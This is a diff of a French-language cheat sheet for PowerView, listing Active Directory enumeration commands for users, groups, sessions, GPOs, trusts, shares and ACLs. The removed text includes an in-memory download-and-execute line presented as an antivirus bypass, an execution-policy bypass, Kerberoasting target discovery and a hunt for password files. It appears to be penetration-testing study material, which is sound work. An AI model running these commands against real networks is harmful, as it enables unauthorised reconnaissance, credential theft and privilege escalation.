@@ -1,395 +1,195 @@
-**Objectif :** PowerView est un module PowerShell faisant partie de la suite PowerSploit. Il est spécialisé dans l'énumération et l'exploitation d'environnements Active Directory (AD). Il permet de cartographier le domaine, trouver des utilisateurs, groupes, ordinateurs, GPOs, ACLs, et identifier des chemins potentiels d'escalade de privilèges ou de mouvement latéral.
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
 
-**Source :** [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+### 🔍 Exploration du Domaine
 
----
+#### Trouver des informations sur le domaine actuel
 
-### 🚀 **Chargement de PowerView**
-
-* **Méthode 1 : Fichier local**
-  ```powershell
-  # Naviguer vers le dossier contenant PowerView.ps1
-  Import-Module .\PowerView.ps1
-```
-
-- **Méthode** 2 : **Téléchargement et exécution en mémoire (bypass)**
-    
-```
-# Attention : Peut être détecté par les antivirus/EDR
-IEX (New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)')
-```
-
-
-> [!Attention]
-> 
-> L'exécution de scripts PowerShell peut être restreinte par la politique d'exécution (ExecutionPolicy). Utilisez Set-ExecutionPolicy Bypass -Scope Process pour la contourner temporairement dans la session courante (si autorisé).
-
-### 🔍 **Exploration du Domaine et de la Forêt**
-
-#### Informations sur le domaine actuel
-
-```
+```powershell
 Get-NetDomain
 ```
 
-- **Contexte :** Récupère les informations de base sur le domaine AD auquel la machine actuelle est jointe (nom, SID, contrôleurs de domaine, niveau fonctionnel...).
-    
-- **Usage :** Point de départ pour comprendre l'environnement AD actuel.
-    
+Affiche des informations sur le domaine Active Directory auquel la machine appartient.
 
-#### Informations sur un domaine spécifique
+#### Trouver des informations sur un domaine spécifique
 
-```
-Get-NetDomain -Domain <nom_domaine>
+```powershell
+Get-NetDomain -Domain [nom_domaine]
 ```
 
-- **Contexte :** Interroge un autre domaine (accessible via une relation de confiance ou si un DC est spécifié).
-    
-- **Usage :** Énumération de domaines dans une forêt ou des domaines approuvés.
-    
+Permet d'obtenir des détails sur un autre domaine si un **trust** existe.
 
-#### Trouver un contrôleur de domaine (DC)
+#### Trouver un contrôleur de domaine
 
-```
-Get-NetDomainController [-Domain <nom_domaine>]
+```powershell
+Get-NetDomainController
 ```
 
-- **Contexte :** Identifie les contrôleurs de domaine pour le domaine actuel ou un domaine spécifié.
-    
-- **Usage :** Trouver les serveurs KDC et LDAP cibles pour d'autres requêtes.
-    
+Renvoie le **nom du contrôleur de domaine** actuel.
 
-#### Informations sur la forêt actuelle
+---
 
-```
-Get-NetForest [-Forest <nom_foret>]
-```
+### 👥 Utilisateurs et Groupes
 
-- **Contexte :** Obtient des informations sur la forêt AD (domaines membres, catalogue global...).
-    
-- **Usage :** Comprendre la structure globale si plusieurs domaines existent.
-    
+#### Trouver des informations sur un utilisateur
 
-#### Lister les domaines de la forêt
-
-```
-Get-NetForestDomain [-Forest <nom_foret>]
+```powershell
+Get-NetUser -Username [nom_utilisateur]
 ```
 
-- **Contexte :** Énumère tous les domaines appartenant à la forêt actuelle ou spécifiée.
-    
-- **Usage :** Cartographie complète des domaines au sein de la forêt.
-    
-
-#### Trouver les serveurs de Catalogue Global (GC)
-
-```
-Get-NetForestCatalog [-Forest <nom_foret>]
-```
-
-- **Contexte :** Identifie les serveurs GC, qui contiennent une copie partielle des objets de tous les domaines de la forêt.
-    
-- **Usage :** Utile pour des recherches rapides à l'échelle de la forêt.
-    
-
-### 👥 **Utilisateurs et Groupes**
-
-#### Informations sur un utilisateur
-
-```
-Get-NetUser [-UserName <nom_utilisateur>] [-Properties *] [-Domain <nom_domaine>]
-```
-
-- **Contexte :** Récupère les attributs d'un ou plusieurs utilisateurs (par défaut l'utilisateur courant).
-    
-- **Usage :** Obtenir des détails sur un utilisateur (SID, groupes, description, date de dernière connexion...). `-Properties *` est crucial pour voir tous les attributs.
-    
-- **Astuce :** Utilisez `-LDAPFilter` pour des recherches complexes (ex: `Get-NetUser -LDAPFilter '(description=*admin*)' -Properties description`).
-    
+Affiche des informations détaillées sur un utilisateur spécifique, y compris **email, SID et groupes associés**.
 
 #### Lister tous les utilisateurs du domaine
 
-```
-Get-NetUser -Domain <nom_domaine> | select SamAccountName, Description, PwdLastSet, LastLogonDate
-```
-
-- **Contexte :** Énumère tous les comptes utilisateurs du domaine.
-    
-- **Usage :** Obtenir une liste complète des utilisateurs pour d'autres analyses (spraying, recherche de comptes inactifs...).
-    
-
-#### Trouver les utilisateurs avec SPN (Kerberoastable)
-
-```
-Get-NetUser -SPN -Properties serviceprincipalname, samaccountname
+```powershell
+Get-NetUser | select cn
 ```
 
-- **Contexte :** Identifie les comptes utilisateurs configurés avec un Service Principal Name (SPN), les rendant potentiellement vulnérables au Kerberoasting.
-    
-- **Usage :** Trouver des cibles pour extraire des TGS et tenter de cracker leur mot de passe hors ligne.
-    
+Affiche uniquement les **noms communs (CN)** des utilisateurs.
 
-#### Informations sur un groupe
+#### Trouver des informations sur un groupe
 
-```
-Get-NetGroup [-GroupName <nom_groupe>] [-Properties *] [-FullData] [-Domain <nom_domaine>]
+```powershell
+Get-NetGroup -GroupName [nom_groupe]
 ```
 
-- **Contexte :** Récupère les informations sur un ou plusieurs groupes AD.
-    
-- **Usage :** Obtenir les détails d'un groupe (SID, membres, description...). `-FullData` fournit plus d'informations.
-    
+Récupère des détails sur un **groupe** AD spécifique.
 
 #### Lister tous les groupes du domaine
 
-```
-Get-NetGroup -Domain <nom_domaine> | select SamAccountName, GroupCategory, Description
-```
-
-- **Contexte :** Énumère tous les groupes du domaine.
-    
-- **Usage :** Identifier les groupes potentiellement privilégiés (Admins, DnsAdmins, etc.).
-    
-
-#### Trouver les membres d'un groupe (récursivement)
-
-```
-Get-NetGroupMember -GroupName <nom_groupe> [-Recurse] [-Domain <nom_domaine>]
+```powershell
+Get-NetGroup -FullData
 ```
 
-- **Contexte :** Liste les membres (utilisateurs, groupes, ordinateurs) d'un groupe spécifique.
-    
-- **Usage :** Comprendre qui a les privilèges associés à un groupe. `-Recurse` explore les groupes imbriqués.
-    
+Affiche la liste complète des groupes avec toutes les informations associées.
 
-#### Lister les groupes d'appartenance d'un utilisateur
+#### Trouver les membres d’un groupe
 
-```
-Get-NetGroup -UserName <nom_utilisateur> [-Domain <nom_domaine>]
-# Alternative :
-Get-NetUser -Identity <nom_utilisateur> -Properties MemberOf | Select -ExpandProperty MemberOf
+```powershell
+Get-NetGroupMember -GroupName [nom_groupe]
 ```
 
-- **Contexte :** Détermine à quels groupes un utilisateur appartient.
-    
-- **Usage :** Évaluer les privilèges d'un utilisateur compromis.
-    
+Affiche les utilisateurs et machines qui font partie du **groupe**.
 
-### 💻 **Exploration des Ordinateurs**
+#### Lister les groupes auxquels appartient un utilisateur
+
+```powershell
+Get-NetGroup -Username [nom_utilisateur]
+```
+
+Affiche tous les **groupes d’appartenance** d’un utilisateur donné.
+
+---
+
+### 🖥️ Exploration des Ordinateurs
 
 #### Lister tous les ordinateurs du domaine
 
-```
-Get-NetComputer [-FullData] [-Domain <nom_domaine>]
+```powershell
+Get-NetComputer
 ```
 
-- **Contexte :** Énumère les objets ordinateur dans l'AD.
-    
-- **Usage :** Identifier les serveurs, postes de travail, et potentiellement les contrôleurs de domaine. `-FullData` ou `-Properties *` pour plus de détails (OS, etc.).
-    
+Récupère la liste des machines du domaine.
+
+#### Trouver des informations détaillées sur un ordinateur spécifique
+
+```powershell
+Get-NetComputer -ComputerName [nom_ordi] -FullData
+```
+
+Affiche **l'OS, le type d'ordinateur et d'autres propriétés**.
 
 #### Trouver des ordinateurs avec un OS spécifique
 
-```
-Get-NetComputer -OperatingSystem "*Server 2016*" -Domain <nom_domaine>
-```
-
-- **Contexte :** Filtre les ordinateurs par chaîne de caractères dans leur attribut OperatingSystem.
-    
-- **Usage :** Cibler des types spécifiques de machines (ex: anciens OS, serveurs).
-    
-
-#### Tester la connectivité (Ping) des ordinateurs
-
-```
-Get-NetComputer -Ping [-Domain <nom_domaine>]
+```powershell
+Get-NetComputer -OperatingSystem "*Server*"
 ```
 
-- **Contexte :** Tente de pinger chaque ordinateur trouvé dans l'AD.
-    
-- **Usage :** Vérifier rapidement quels ordinateurs sont en ligne (peut être bloqué par un pare-feu).
-    
+Permet de **filtrer** les ordinateurs ayant un **OS spécifique**, par exemple, les **serveurs Windows**.
 
-### 🔄 **Sessions et Accès Local**
+---
 
-> [!Attention]
-> 
-> Ces commandes interrogent les machines distantes et nécessitent souvent des privilèges (admin local sur la cible) et génèrent du trafic réseau potentiellement détectable.
+### 🔄 Sessions et Connexions
 
 #### Lister les sessions actives sur un ordinateur
 
-```
-Get-NetSession -ComputerName <nom_ordi_ou_ip>
-```
-
-- **Contexte :** Interroge la machine cible pour savoir quels utilisateurs ont des sessions SMB ouvertes _vers_ elle.
-    
-- **Usage :** Identifier qui accède aux ressources d'un serveur spécifique.
-    
-
-#### Lister les utilisateurs connectés sur une machine
-
-```
-Get-NetLoggedon -ComputerName <nom_ordi_ou_ip>
+```powershell
+Get-NetSession -ComputerName [nom_ordi]
 ```
 
-- **Contexte :** Tente de déterminer quels utilisateurs sont actuellement connectés (localement ou via RDP) sur la machine cible.
-    
-- **Usage :** Trouver où des utilisateurs spécifiques (ex: admins) sont connectés.
-    
+Affiche les **sessions d’utilisateurs actuellement connectés**.
 
-#### Trouver les machines où l'utilisateur courant a des droits admin local
+#### Lister les connexions ouvertes sur une machine
 
-```
-Find-LocalAdminAccess [-ComputerName <liste_ordis>] [-Verbose]
+```powershell
+Get-NetLoggedon -ComputerName [nom_ordi]
 ```
 
-- **Contexte :** Tente de se connecter à l'IPC$ ou au registre des machines cibles pour vérifier si l'utilisateur courant a des droits d'administrateur local.
-    
-- **Usage :** Identifier des cibles pour le mouvement latéral si l'utilisateur courant a des privilèges sur d'autres machines.
-    
+Renvoie la liste des **utilisateurs loggés sur la machine cible**.
 
-#### Trouver où des utilisateurs/groupes spécifiques sont connectés ou ont des droits admin
+#### Trouver sur quelles machines un utilisateur est connecté
 
-```
-Find-DomainUserLocation -UserGroupIdentity <nom_utilisateur_ou_groupe> [-CheckAccess] [-Domain <nom_domaine>]
+```powershell
+Find-LocalAdminAccess -ComputerName [nom_ordi]
 ```
 
-- **Contexte :** Combine `Get-NetLoggedon` et `Get-NetSession` pour trouver où un utilisateur/groupe est potentiellement actif.
-    
-- **Usage :** Chasse aux sessions d'utilisateurs privilégiés. `-CheckAccess` tente de vérifier les droits admin local (plus intrusif).
-    
+Recherche si un utilisateur dispose de **droits d’admin local** sur d’autres machines.
 
-### 🏛️ **Gestion des Politiques de Groupe (GPO)**
+---
 
-#### Lister les GPO du domaine
+### 🏛 Gestion des Politiques de Groupe (GPO)
 
-```
-Get-NetGPO [-ComputerName <nom_ordi>] [-Domain <nom_domaine>]
-```
+#### Lister les GPO appliquées à un ordinateur
 
-- **Contexte :** Énumère toutes les GPO du domaine ou celles appliquées à un ordinateur spécifique.
-    
-- **Usage :** Identifier les politiques de sécurité, les déploiements logiciels, les scripts de démarrage/connexion.
-    
-
-#### Trouver les GPO modifiant les groupes locaux (Restricted Groups / Group Policy Preferences)
-
-```
-Get-NetGPOGroup [-Domain <nom_domaine>]
+```powershell
+Get-NetGPO -ComputerName [nom_ordi]
 ```
 
-- **Contexte :** Recherche spécifiquement les GPO qui configurent l'appartenance des groupes locaux sur les machines (ex: ajout d'un groupe AD au groupe Administrateurs local).
-    
-- **Usage :** Identifier des GPO qui pourraient accorder des privilèges admin local à certains utilisateurs/groupes sur des OUs spécifiques.
-    
+Affiche toutes les **GPO (Group Policy Objects)** appliquées à un ordinateur.
 
-#### Trouver quelles machines sont affectées par une GPO spécifique
+#### Lister les GPO définissant des droits utilisateur/administrateur
 
-```
-Get-NetOU -GPLink <nom_ou_guid_gpo> | Get-NetComputer
+```powershell
+Get-NetGPOGroup
 ```
 
-- **Contexte :** Identifie les OUs liées à une GPO, puis liste les ordinateurs dans ces OUs.
-    
-- **Usage :** Comprendre la portée d'application d'une GPO potentiellement intéressante.
-    
+Recherche les **GPO** qui **ajoutent des droits admin** à des utilisateurs ou groupes.
 
-### 🔗 **Relations de Confiance Active Directory (Trusts)**
+---
 
-#### Lister les relations de confiance du domaine
+### 🔗 Relations de Confiance Active Directory
 
-```
-Get-NetDomainTrust [-Domain <nom_domaine>]
-```
+#### Lister les relations de confiance d’un domaine
 
-- **Contexte :** Affiche les relations de confiance (entrantes, sortantes, type, transitivité) établies par le domaine actuel ou spécifié.
-    
-- **Usage :** Identifier des chemins d'attaque potentiels vers d'autres domaines ou forêts.
-    
-
-#### Lister les relations de confiance de la forêt
-
-```
-Get-NetForestTrust [-Forest <nom_foret>]
+```powershell
+Get-NetDomainTrust
 ```
 
-- **Contexte :** Énumère les relations de confiance au niveau de la forêt.
-    
-- **Usage :** Obtenir une vue d'ensemble des relations entre différentes forêts.
-    
+Affiche les **relations de confiance inter-domaines** pour identifier d’éventuelles escalades.
 
-### 🎯 **Recherche d'Objets et de Fichiers**
+---
 
-#### Rechercher des objets AD avec un filtre LDAP
+### 🎯 Divers et Recherche Active Directory
 
-```
-Find-ADObject -LDAPFilter <filtre_ldap> -Properties <prop1,prop2,...>
-# Exemple : Trouver les comptes de service
-Find-ADObject -LDAPFilter '(&(samAccountType=805306368)(msDS-ManagedPasswordInterval=*))' -Properties samaccountname,serviceprincipalname
+#### Rechercher des objets spécifiques dans Active Directory
+
+```powershell
+Find-ADObject -SearchBase "LDAP://OU=Users,DC=domaine,DC=com"
 ```
 
-- **Contexte :** Permet des recherches très spécifiques dans l'AD en utilisant la syntaxe de filtre LDAP.
-    
-- **Usage :** Recherche avancée d'objets répondant à des critères précis.
-    
+Effectue une **recherche avancée** d’objets **dans une unité organisationnelle (OU)** spécifique.
 
-#### Rechercher des partages SMB accessibles
+#### Trouver des objets intéressants (partages, machines vulnérables)
 
-```
-Invoke-ShareFinder [-ComputerName <liste_ordis>] [-CheckShareAccess] [-Verbose]
+```powershell
+Invoke-ShareFinder -CheckShareAccess
 ```
 
-- **Contexte :** Découvre les partages SMB sur les machines spécifiées (ou toutes celles du domaine par défaut).
-    
-- **Usage :** Identifier des partages potentiellement intéressants. `-CheckShareAccess` vérifie si l'utilisateur courant a des droits de lecture.
-    
+Recherche des **partages SMB** accessibles et liste ceux qui sont **potentiellement sensibles**.
 
-#### Rechercher des fichiers sensibles sur les partages accessibles
+#### Enumérer les permissions d’un objet (ACLs)
 
-```
-Invoke-FileFinder [-ComputerName <liste_ordis>] -Search <motif> [-Verbose]
-# Exemple : Chercher des fichiers contenant "password" dans leur nom
-Invoke-FileFinder -Search "*password*"
+```powershell
+Get-ObjectAcl -SamAccountName [nom_objet] -ResolveGUIDs
 ```
 
-- **Contexte :** Recherche des fichiers correspondant à un motif sur les partages SMB accessibles.
-    
-- **Usage :** Trouver des fichiers de configuration, scripts, backups contenant potentiellement des informations sensibles.
-    
-
-### 🛡️ **Analyse des Permissions (ACLs)**
-
-#### Lister les ACLs d'un objet AD
-
-```
-Get-ObjectAcl -SamAccountName <nom_objet> [-ResolveGUIDs] [-Domain <nom_domaine>]
-# Alternative :
-Get-ObjectAcl -ADSpath "LDAP://CN=AdminGroup,OU=Groups,DC=domain,DC=local" -ResolveGUIDs
-```
-
-- **Contexte :** Affiche la liste de contrôle d'accès (ACL) pour un objet AD spécifique (utilisateur, groupe, ordinateur, OU, GPO...).
-    
-- **Usage :** Identifier qui a quels droits sur un objet. Crucial pour trouver des chemins d'escalade de privilèges (ex: droit d'écriture sur un groupe admin, droit de réinitialiser un mot de passe...). `-ResolveGUIDs` traduit les GUIDs en noms connus.
-    
-
-#### Trouver des ACLs intéressantes dans le domaine
-
-```
-Find-InterestingDomainAcl [-ResolveGUIDs] [-Domain <nom_domaine>]
-```
-
-- **Contexte :** Recherche automatiquement des configurations d'ACL potentiellement exploitables dans tout le domaine (droits de modification sur des objets privilégiés, GenericAll, WriteDacl, etc.).
-    
-- **Usage :** Point de départ rapide pour identifier des faiblesses de configuration des permissions AD.
-    
-
-#### Lister les ACLs d'un chemin de fichier/dossier (local ou UNC)
-
-```
-Get-PathAcl -Path <chemin>
-# Exemple :
-Get-PathAcl -Path "\\DC01\SYSVOL"
-```
-
-- **Contexte :** Affiche les permissions
+Affiche les **permissions** sur un **utilisateur, groupe, machine ou GPO**, utile pour la **privesc**.
